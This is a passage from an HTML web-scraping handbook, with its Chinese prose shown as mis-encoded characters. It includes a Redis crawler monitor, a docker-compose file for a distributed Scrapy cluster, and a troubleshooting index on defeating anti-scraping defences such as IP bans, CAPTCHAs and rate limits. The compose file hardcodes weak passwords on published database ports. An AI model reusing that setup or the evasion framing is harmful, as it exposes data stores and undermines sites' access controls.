<span class="w">    </span><span class="sd">&quot;&quot;&quot;çˆ¬è™«ç›‘æ§&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">redis_host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">redis_port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">redis_password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">redis_db</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span>
            <span class="n">host</span><span class="o">=</span><span class="n">redis_host</span><span class="p">,</span>
            <span class="n">port</span><span class="o">=</span><span class="n">redis_port</span><span class="p">,</span>
            <span class="n">password</span><span class="o">=</span><span class="n">redis_password</span><span class="p">,</span>
            <span class="n">db</span><span class="o">=</span><span class="n">redis_db</span><span class="p">,</span>
            <span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_spider_stats</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider_name</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–çˆ¬è™«ç»Ÿè®¡ä¿¡æ¯&quot;&quot;&quot;</span>
        <span class="n">stats</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="c1"># é˜Ÿåˆ—å¤§å°</span>
        <span class="n">queue_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider_name</span><span class="si">}</span><span class="s2">:requests&quot;</span>
        <span class="n">stats</span><span class="p">[</span><span class="s1">&#39;queue_size&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">llen</span><span class="p">(</span><span class="n">queue_key</span><span class="p">)</span>

        <span class="c1"># å»é‡é›†åˆå¤§å°</span>
        <span class="n">dupefilter_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider_name</span><span class="si">}</span><span class="s2">:dupefilter&quot;</span>
        <span class="n">stats</span><span class="p">[</span><span class="s1">&#39;processed_urls&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">scard</span><span class="p">(</span><span class="n">dupefilter_key</span><span class="p">)</span>

        <span class="c1"># ç¼“å­˜æ•°é‡</span>
        <span class="n">cache_pattern</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider_name</span><span class="si">}</span><span class="s2">:cache:*&quot;</span>
        <span class="n">stats</span><span class="p">[</span><span class="s1">&#39;cached_items&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">keys</span><span class="p">(</span><span class="n">cache_pattern</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">stats</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">monitor</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider_name</span><span class="p">,</span> <span class="n">interval</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        æŒç»­ç›‘æ§</span>

<span class="sd">        Args:</span>
<span class="sd">            spider_name: çˆ¬è™«åç§°</span>
<span class="sd">            interval: åˆ·æ–°é—´éš”ï¼ˆç§’ï¼‰</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ğŸ” Monitoring </span><span class="si">{</span><span class="n">spider_name</span><span class="si">}</span><span class="s2">... (Press Ctrl+C to stop)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
                <span class="n">stats</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_spider_stats</span><span class="p">(</span><span class="n">spider_name</span><span class="p">)</span>

                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\r</span><span class="s2">ğŸ“Š Queue: </span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;queue_size&#39;</span><span class="p">]</span><span class="si">:</span><span class="s2">&gt;6</span><span class="si">}</span><span class="s2"> | &quot;</span>
                      <span class="sa">f</span><span class="s2">&quot;Processed: </span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;processed_urls&#39;</span><span class="p">]</span><span class="si">:</span><span class="s2">&gt;8</span><span class="si">}</span><span class="s2"> | &quot;</span>
                      <span class="sa">f</span><span class="s2">&quot;Cached: </span><span class="si">{</span><span class="n">stats</span><span class="p">[</span><span class="s1">&#39;cached_items&#39;</span><span class="p">]</span><span class="si">:</span><span class="s2">&gt;6</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
                      <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">interval</span><span class="p">)</span>

        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">âœ… Monitoring stopped&quot;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">monitor</span> <span class="o">=</span> <span class="n">CrawlerMonitor</span><span class="p">(</span>
        <span class="n">redis_host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
        <span class="n">redis_port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span>
        <span class="n">redis_password</span><span class="o">=</span><span class="s1">&#39;redis123&#39;</span>
    <span class="p">)</span>

    <span class="n">monitor</span><span class="o">.</span><span class="n">monitor</span><span class="p">(</span><span class="s1">&#39;target_spider&#39;</span><span class="p">,</span> <span class="n">interval</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="10-dockerdocker-composeyml">10. docker/docker-compose.yml</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3.8&#39;</span>

<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="c1"># Redis</span>
<span class="w">  </span><span class="nt">redis</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis:7-alpine</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">crawler_redis</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis-server --requirepass redis123 --maxmemory 512mb</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;6379:6379&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis_data:/data</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">crawler_network</span>

<span class="w">  </span><span class="c1"># MongoDB</span>
<span class="w">  </span><span class="nt">mongodb</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongo:7.0</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">crawler_mongodb</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_ROOT_USERNAME</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admin</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_ROOT_PASSWORD</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admin123</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;27017:27017&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb_data:/data/db</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">crawler_network</span>

<span class="w">  </span><span class="c1"># Scrapy Master (è°ƒåº¦å™¨)</span>
<span class="w">  </span><span class="nt">master</span><span class="p">:</span>
<span class="w">    </span><span class="nt">build</span><span class="p">:</span>
<span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">..</span>
<span class="w">      </span><span class="nt">dockerfile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/Dockerfile.scheduler</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">crawler_master</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="nt">REDIS_HOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis</span>
<span class="w">      </span><span class="nt">REDIS_PORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">6379</span>
<span class="w">      </span><span class="nt">REDIS_PASSWORD</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis123</span>
<span class="w">      </span><span class="nt">MONGODB_URI</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb://admin:admin123@mongodb:27017/</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">crawler_network</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python scheduler/task_manager.py</span>

<span class="w">  </span><span class="c1"># Scrapy Worker (çˆ¬è™«èŠ‚ç‚¹)</span>
<span class="w">  </span><span class="nt">spider</span><span class="p">:</span>
<span class="w">    </span><span class="nt">build</span><span class="p">:</span>
<span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">..</span>
<span class="w">      </span><span class="nt">dockerfile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/Dockerfile.spider</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="nt">REDIS_HOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis</span>
<span class="w">      </span><span class="nt">REDIS_PORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">6379</span>
<span class="w">      </span><span class="nt">REDIS_PASSWORD</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis123</span>
<span class="w">      </span><span class="nt">MONGODB_URI</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb://admin:admin123@mongodb:27017/</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">crawler_network</span>
<span class="w">    </span><span class="nt">deploy</span><span class="p">:</span>
<span class="w">      </span><span class="nt">replicas</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">3</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scrapy crawl target_spider</span>

<span class="nt">networks</span><span class="p">:</span>
<span class="w">  </span><span class="nt">crawler_network</span><span class="p">:</span>
<span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bridge</span>

<span class="nt">volumes</span><span class="p">:</span>
<span class="w">  </span><span class="nt">redis_data</span><span class="p">:</span>
<span class="w">  </span><span class="nt">mongodb_data</span><span class="p">:</span>
</code></pre>
      </div>

      <h3 id="11-requirementstxt">11. requirements.txt</h3>

      <pre><code>Scrapy&gt;=2.11.0
scrapy-redis&gt;=0.7.3
redis&gt;=5.0.0
pymongo&gt;=4.6.0
python-dotenv&gt;=1.0.0
w3lib&gt;=2.1.0
itemadapter&gt;=0.8.0
</code></pre>

      <hr />

      <h2 id="ä½¿ç”¨æŒ‡å—">ğŸš€ ä½¿ç”¨æŒ‡å—</h2>

      <h3 id="å•æœºæµ‹è¯•">å•æœºæµ‹è¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. å®‰è£…ä¾èµ–</span>
pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt

<span class="c1"># 2. å¯åŠ¨ Redis å’Œ MongoDB</span>
docker-compose<span class="w"> </span>up<span class="w"> </span>-d<span class="w"> </span>redis<span class="w"> </span>mongodb

<span class="c1"># 3. æ·»åŠ ä»»åŠ¡</span>
python<span class="w"> </span>scripts/add_tasks.py

<span class="c1"># 4. å¯åŠ¨çˆ¬è™«</span>
scrapy<span class="w"> </span>crawl<span class="w"> </span>target_spider

<span class="c1"># 5. ç›‘æ§è¿›åº¦</span>
python<span class="w"> </span>scripts/monitor.py
</code></pre>
      </div>

      <h3 id="åˆ†å¸ƒå¼éƒ¨ç½²">åˆ†å¸ƒå¼éƒ¨ç½²</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. æ„å»ºå¹¶å¯åŠ¨æ‰€æœ‰æœåŠ¡</span>
docker-compose<span class="w"> </span>up<span class="w"> </span>-d

<span class="c1"># 2. æ‰©å®¹çˆ¬è™«èŠ‚ç‚¹</span>
docker-compose<span class="w"> </span>up<span class="w"> </span>-d<span class="w"> </span>--scale<span class="w"> </span><span class="nv">spider</span><span class="o">=</span><span class="m">5</span>

<span class="c1"># 3. æŸ¥çœ‹æ—¥å¿—</span>
docker-compose<span class="w"> </span>logs<span class="w"> </span>-f<span class="w"> </span>spider

<span class="c1"># 4. æŸ¥çœ‹ç»Ÿè®¡</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>crawler_master<span class="w"> </span>python<span class="w"> </span>scripts/monitor.py
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³èµ„æº">ğŸ“š ç›¸å…³èµ„æº</h2>

      <ul>
        <li><a href="#09-Templates-basic-scraper">åŸºç¡€çˆ¬è™«é¡¹ç›®</a></li>
        <li><a href="#09-Templates-docker-setup">Docker éƒ¨ç½²</a></li>
        <li><a href="#06-Engineering-distributed-scraping">åˆ†å¸ƒå¼çˆ¬è™«</a></li>
        <li><a href="https://docs.scrapy.org/">Scrapy æ–‡æ¡£</a></li>
        <li><a href="https://github.com/rmax/scrapy-redis">scrapy-redis æ–‡æ¡£</a></li>
      </ul>

    </div>

    <div class="section" id="10-Troubleshooting-index">
      <h2>74. Overview</h2>
      <h1 id="æ•…éšœæ’é™¤-troubleshooting">æ•…éšœæ’é™¤ - Troubleshooting</h1>

      <p>é‡åˆ°é—®é¢˜ï¼Ÿè¿™é‡Œæœ‰å¸¸è§é—®é¢˜çš„è§£å†³æ–¹æ¡ˆå’Œè°ƒè¯•æŠ€å·§ã€‚</p>

      <hr />

      <h2 id="é—®é¢˜åˆ†ç±»">ğŸ” é—®é¢˜åˆ†ç±»</h2>

      <h3 id="ç½‘ç»œå’Œè¯·æ±‚é—®é¢˜10-troubleshooting-network-issues"><a href="#10-Troubleshooting-network-issues">ğŸŒ ç½‘ç»œå’Œè¯·æ±‚é—®é¢˜</a></h3>

      <ul>
        <li>è¯·æ±‚è¶…æ—¶</li>
        <li>è¿æ¥è¢«æ‹’ç»</li>
        <li>SSL è¯ä¹¦é”™è¯¯</li>
        <li>ä»£ç†é…ç½®é—®é¢˜</li>
        <li>Cookie å¤±æ•ˆ</li>
      </ul>

      <h3 id="åçˆ¬è™«é—®é¢˜10-troubleshooting-anti-scraping-issues"><a href="#10-Troubleshooting-anti-scraping-issues">ğŸ”’
          åçˆ¬è™«é—®é¢˜</a></h3>

      <ul>
        <li>IP è¢«å°ç¦</li>
        <li>éªŒè¯ç æ‹¦æˆª</li>
        <li>User-Agent æ£€æµ‹</li>
        <li>JavaScript æŒ‘æˆ˜</li>
        <li>é¢‘ç‡é™åˆ¶</li>
      </ul>

      <h3 id="javascript-è°ƒè¯•é—®é¢˜10-troubleshooting-javascript-debugging"><a
          href="#10-Troubleshooting-javascript-debugging">ğŸ› JavaScript è°ƒè¯•é—®é¢˜</a></h3>

      <ul>
        <li>æ–­ç‚¹ä¸ç”Ÿæ•ˆ</li>
        <li>å˜é‡æŸ¥çœ‹å¤±è´¥</li>
        <li>Source Map é”™è¯¯</li>
        <li>æ··æ·†ä»£ç è°ƒè¯•</li>
        <li>å¼‚æ­¥ä»£ç è·Ÿè¸ª</li>
      </ul>

      <h3 id="å·¥å…·ä½¿ç”¨é—®é¢˜10-troubleshooting-tool-issues"><a href="#10-Troubleshooting-tool-issues">ğŸ”§ å·¥å…·ä½¿ç”¨é—®é¢˜</a></h3>

      <ul>
        <li>Chrome DevTools é—®é¢˜</li>
        <li>Burp Suite é…ç½®</li>
        <li>Fiddler ä»£ç†é—®é¢˜</li>
        <li>Postman è„šæœ¬é”™è¯¯</li>
        <li>Node.js ç¯å¢ƒé—®é¢˜</li>
      </ul>

      <h3 id="æ•°æ®å¤„ç†é—®é¢˜10-troubleshooting-data-issues"><a href="#10-Troubleshooting-data-issues">ğŸ’¾ æ•°æ®å¤„ç†é—®é¢˜</a></h3>

      <ul>
        <li>ç¼–ç é”™è¯¯</li>
        <li>JSON è§£æå¤±è´¥</li>
        <li>æ•°æ®åº“è¿æ¥é—®é¢˜</li>
        <li>æ–‡ä»¶è¯»å†™é”™è¯¯</li>
        <li>å†…å­˜æº¢å‡º</li>
      </ul>

      <h3 id="docker-éƒ¨ç½²é—®é¢˜10-troubleshooting-docker-issues"><a href="#10-Troubleshooting-docker-issues">ğŸ³ Docker
          éƒ¨ç½²é—®é¢˜</a></h3>

      <ul>
        <li>å®¹å™¨å¯åŠ¨å¤±è´¥</li>
        <li>ç½‘ç»œè¿æ¥é—®é¢˜</li>
        <li>å·æŒ‚è½½é”™è¯¯</li>
        <li>æƒé™é—®é¢˜</li>
        <li>èµ„æºé™åˆ¶</li>
      </ul>

      <hr />

      <h2 id="å¿«é€ŸæŸ¥æ‰¾">ğŸ†˜ å¿«é€ŸæŸ¥æ‰¾</h2>

      <h3 id="æŒ‰é”™è¯¯ä¿¡æ¯æŸ¥æ‰¾">æŒ‰é”™è¯¯ä¿¡æ¯æŸ¥æ‰¾</h3>

      <table>
        <thead>
          <tr>
            <th>é”™è¯¯ä¿¡æ¯</th>
            <th>å¯èƒ½åŸå› </th>
            <th>è§£å†³æ–¹æ¡ˆ</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Connection refused</code></td>
            <td>ç›®æ ‡æœåŠ¡å™¨ä¸å¯ç”¨</td>
            <td><a href="#10-Troubleshooting-network-issues-è¿æ¥è¢«æ‹’ç»">ç½‘ç»œé—®é¢˜</a></td>
          </tr>
          <tr>
            <td><code>SSL certificate verify failed</code></td>
            <td>SSL è¯ä¹¦éªŒè¯å¤±è´¥</td>
            <td><a href="#10-Troubleshooting-network-issues-ssl-è¯ä¹¦é”™è¯¯">SSL é—®é¢˜</a></td>
          </tr>
          <tr>
            <td><code>403 Forbidden</code></td>
            <td>è¢«åçˆ¬è™«æ‹¦æˆª</td>
            <td><a href="#10-Troubleshooting-anti-scraping-issues-403-forbidden">åçˆ¬é—®é¢˜</a></td>
          </tr>
          <tr>
            <td><code>429 Too Many Requests</code></td>
            <td>è¯·æ±‚é¢‘ç‡è¿‡é«˜</td>
            <td><a href="#10-Troubleshooting-anti-scraping-issues-429-too-many-requests">é¢‘ç‡é™åˆ¶</a></td>
          </tr>
          <tr>
            <td><code>JSONDecodeError</code></td>
            <td>JSON æ ¼å¼é”™è¯¯</td>
            <td><a href="#10-Troubleshooting-data-issues-json-è§£æå¤±è´¥">JSON é—®é¢˜</a></td>
          </tr>
          <tr>
            <td><code>UnicodeDecodeError</code></td>
            <td>ç¼–ç é—®é¢˜</td>
            <td><a href="#10-Troubleshooting-data-issues-ç¼–ç é”™è¯¯">ç¼–ç é—®é¢˜</a></td>
          </tr>
          <tr>
            <td><code>TimeoutError</code></td>
            <td>è¯·æ±‚è¶…æ—¶</td>
            <td><a href="#10-Troubleshooting-network-issues-è¯·æ±‚è¶…æ—¶">è¶…æ—¶é—®é¢˜</a></td>
          </tr>
          <tr>
            <td><code>ModuleNotFoundError</code></td>
            <td>æ¨¡å—æœªå®‰è£…</td>
            <td><a href="#10-Troubleshooting-tool-issues-python-ç¯å¢ƒé—®é¢˜">ç¯å¢ƒé—®é¢˜</a></td>
          </tr>
        </tbody>
      </table>

      <h3 id="æŒ‰åœºæ™¯æŸ¥æ‰¾">æŒ‰åœºæ™¯æŸ¥æ‰¾</h3>

      <ul>
        <li><strong>æ— æ³•æŠ“åŒ…</strong>: <a href="#10-Troubleshooting-tool-issues-æŠ“åŒ…å·¥å…·é…ç½®">ä»£ç†é…ç½®</a></li>
        <li><strong>Cookie ä¸ç”Ÿæ•ˆ</strong>: <a href="#10-Troubleshooting-network-issues-cookie-å¤±æ•ˆ">Cookie é—®é¢˜</a></li>
        <li><strong>åŠ å¯†æ— æ³•ç ´è§£</strong>: <a href="#10-Troubleshooting-javascript-debugging">JavaScript è°ƒè¯•</a></li>
        <li><strong>çˆ¬è™«è¢«å°</strong>: <a href="#10-Troubleshooting-anti-scraping-issues">åçˆ¬è™«å¯¹ç­–</a></li>
        <li><strong>æ•°æ®å­˜å‚¨å¤±è´¥</strong>: <a href="#10-Troubleshooting-data-issues-æ•°æ®åº“è¿æ¥é—®é¢˜">æ•°æ®åº“é—®é¢˜</a></li>
      </ul>

      <hr />

      <h2 id="è°ƒè¯•æŠ€å·§">ğŸ› ï¸ è°ƒè¯•æŠ€å·§</h2>

      <h3 id="1-ç³»ç»ŸåŒ–æ’æŸ¥">1. ç³»ç»ŸåŒ–æ’æŸ¥</h3>

      <pre><code>é—®é¢˜å‡ºç°
   â†“
æŸ¥çœ‹é”™è¯¯æ—¥å¿—
   â†“
ç¡®å®šé—®é¢˜ç±»å‹
   â†“
æŸ¥é˜…ç›¸å…³æ–‡æ¡£
   â†“
å°è¯•è§£å†³æ–¹æ¡ˆ
   â†“
éªŒè¯ä¿®å¤
</code></pre>

      <h3 id="2-æ—¥å¿—æ”¶é›†">2. æ—¥å¿—æ”¶é›†</h3>

      <p><strong>Python ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>

<span class="c1"># é…ç½®è¯¦ç»†æ—¥å¿—</span>
<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span>
    <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">,</span>
    <span class="nb">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> - </span><span class="si">%(name)s</span><span class="s1"> - </span><span class="si">%(levelname)s</span><span class="s1"> - </span><span class="si">%(message)s</span><span class="s1">&#39;</span><span class="p">,</span>
    <span class="n">handlers</span><span class="o">=</span><span class="p">[</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">FileHandler</span><span class="p">(</span><span class="s1">&#39;debug.log&#39;</span><span class="p">),</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">StreamHandler</span><span class="p">()</span>
    <span class="p">]</span>
<span class="p">)</span>

<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;è¯¦ç»†è°ƒè¯•ä¿¡æ¯&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>Scrapy ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># settings.py</span>
<span class="n">LOG_LEVEL</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>
<span class="n">LOG_FILE</span> <span class="o">=</span> <span class="s1">&#39;scrapy_debug.log&#39;</span>
</code></pre>
      </div>

      <h3 id="3-ç½‘ç»œè¯·æ±‚è°ƒè¯•">3. ç½‘ç»œè¯·æ±‚è°ƒè¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">requests.adapters</span><span class="w"> </span><span class="kn">import</span> <span class="n">HTTPAdapter</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib3.util.retry</span><span class="w"> </span><span class="kn">import</span> <span class="n">Retry</span>

<span class="c1"># é…ç½®é‡è¯•ç­–ç•¥</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">retry</span> <span class="o">=</span> <span class="n">Retry</span><span class="p">(</span>
    <span class="n">total</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span>
    <span class="n">backoff_factor</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">status_forcelist</span><span class="o">=</span><span class="p">[</span><span class="mi">500</span><span class="p">,</span> <span class="mi">502</span><span class="p">,</span> <span class="mi">503</span><span class="p">,</span> <span class="mi">504</span><span class="p">]</span>
<span class="p">)</span>
<span class="n">adapter</span> <span class="o">=</span> <span class="n">HTTPAdapter</span><span class="p">(</span><span class="n">max_retries</span><span class="o">=</span><span class="n">retry</span><span class="p">)</span>
<span class="n">session</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>
<span class="n">session</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s1">&#39;https://&#39;</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>

<span class="c1"># è¯¦ç»†æ—¥å¿—</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">http.client</span>
<span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="o">.</span><span class="n">debuglevel</span> <span class="o">=</span> <span class="mi">1</span>
</code></pre>
      </div>

      <h3 id="4-javascript-è°ƒè¯•">4. JavaScript è°ƒè¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. æ·»åŠ æ¡ä»¶æ–­ç‚¹</span>
<span class="c1">// å³é”®æ–­ç‚¹ -&gt; Edit breakpoint -&gt; è¾“å…¥æ¡ä»¶</span>
<span class="c1">// ä¾‹å¦‚: userId === 123</span>

<span class="c1">// 2. ä½¿ç”¨ debugger è¯­å¥</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">suspiciousFunction</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// ä»£ç ä¼šåœ¨è¿™é‡Œæš‚åœ</span>
<span class="w">    </span><span class="c1">// ... å¯ç–‘ä»£ç </span>
<span class="p">}</span>

<span class="c1">// 3. ç›‘æ§å˜é‡å˜åŒ–</span>
<span class="c1">// Sources -&gt; Watch -&gt; æ·»åŠ è¡¨è¾¾å¼</span>

<span class="c1">// 4. æŸ¥çœ‹è°ƒç”¨æ ˆ</span>
<span class="c1">// Sources -&gt; Call Stack</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜-faq">ğŸ“‹ å¸¸è§é—®é¢˜ FAQ</h2>

